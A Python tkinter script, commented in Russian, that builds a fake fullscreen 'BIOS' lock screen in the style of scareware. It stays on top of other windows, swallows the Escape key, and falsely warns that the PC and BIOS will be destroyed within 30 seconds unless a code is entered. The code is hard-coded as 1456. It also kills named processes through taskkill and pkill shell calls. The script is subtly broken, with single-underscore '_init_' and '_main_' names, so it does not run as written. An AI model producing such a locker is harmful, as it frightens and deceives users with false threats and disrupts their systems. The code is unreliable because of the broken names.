import tkinter as tk
import time
import sys
import os

def terminate_process(process_name):
    """Завершает процесс по имени"""
    try:
        if os.name == 'nt':  # Windows
            os.system(f'taskkill /f /im {process_name}')
        else:  # Linux/Mac
            os.system(f'pkill -f {process_name}')
    except:
        pass

class BiosLockScreen:
    def _init_(self):
        # Завершаем процесс example.exe при запуске
        terminate_process("example.exe")
        
        self.root = tk.Tk()
        self.setup_window()
        self.create_widgets()
        
        self.countdown = 30
        self.attempts = 0
        self.correct_code = "1456"
        
        self.update_timer()
        
    def setup_window(self):
        """Настраивает полноэкранное окно"""
        self.root.attributes('-fullscreen', True)
        self.root.configure(bg='#000080')  # Синий цвет как в BIOS
        self.root.bind('<Escape>', lambda e: 'break')  # Блокируем Escape
        
        # Делаем окно поверх всех других
        self.root.attributes('-topmost', True)
        
    def create_widgets(self):
        """Создает элементы интерфейса"""
        # Основной текст
        main_text = """Your PC has been locked! And can be destroyed by 30 seconds. 
If you try to close or remove virus, your windows and bios has been corrupted. 
To close banner you need code! You have 30 seconds."""
        
        self.text_label = tk.Label(
            self.root, 
            text=main_text, 
            fg='white', 
            bg='#000080',
            font=('Courier New', 16, 'bold'),
            justify='center'
        )
        self.text_label.pack(pady=50)
        
        # Таймер
        self.timer_label = tk.Label(
            self.root,
            text="30",
            fg='white',
            bg='#000080',
            font=('Courier New', 48, 'bold')
        )
        self.timer_label.pack(pady=30)
        
        # Поле ввода с толстым курсором
        self.entry_frame = tk.Frame(self.root, bg='#000080')
        self.entry_frame.pack(pady=20)
        
        self.entry = tk.Entry(
            self.entry_frame,
            font=('Courier New', 18),
            bg='black',
            fg='white',
            insertbackground='white',
            width=20,
            show="*"  # Скрываем ввод
        )
        self.entry.pack()
        
        # Настраиваем толстый курсор
        self.entry.config(insertwidth=4)  # Делаем курсор толще
        
        # Кнопка OK без обводки
        self.ok_button = tk.Button(
            self.root,
            text="OK",
            font=('Courier New', 16, 'bold'),
            bg='#000080',
            fg='white',
            activebackground='#000080',
            activeforeground='white',
            relief='flat',  # Убираем обводку
            border=0,
            command=self.check_code
        )
        self.ok_button.pack(pady=20)
        
        # Биндим Enter на проверку кода
        self.entry.bind('<Return>', lambda e: self.check_code())
        
    def update_timer(self):
        """Обновляет таймер"""
        if self.countdown > 0:
            self.timer_label.config(text=str(self.countdown))
            self.countdown -= 1
            self.root.after(1000, self.update_timer)
        else:
            # По окончании таймера закрываем untitled.exe
            terminate_process("untitled.exe")
            self.root.destroy()
    
    def check_code(self):
        """Проверяет введенный код"""
        entered_code = self.entry.get()
        
        if entered_code == self.correct_code:
            # Правильный код - закрываем приложение
            self.root.destroy()
        else:
            # Неправильный код
            self.attempts += 1
            self.entry.delete(0, tk.END)
            
            if self.attempts >= 1:
                # После первой ошибки закрываем test.exe
                terminate_process("test.exe")
            
            # Мигание красным при ошибке
            self.flash_error()
    
    def flash_error(self):
        """Мигание красным цветом при ошибке"""
        original_bg = self.entry.cget('bg')
        self.entry.config(bg='red')
        self.root.after(200, lambda: self.entry.config(bg='black'))

if _name_ == "_main_":
    app = BiosLockScreen()
    app.root.mainloop()
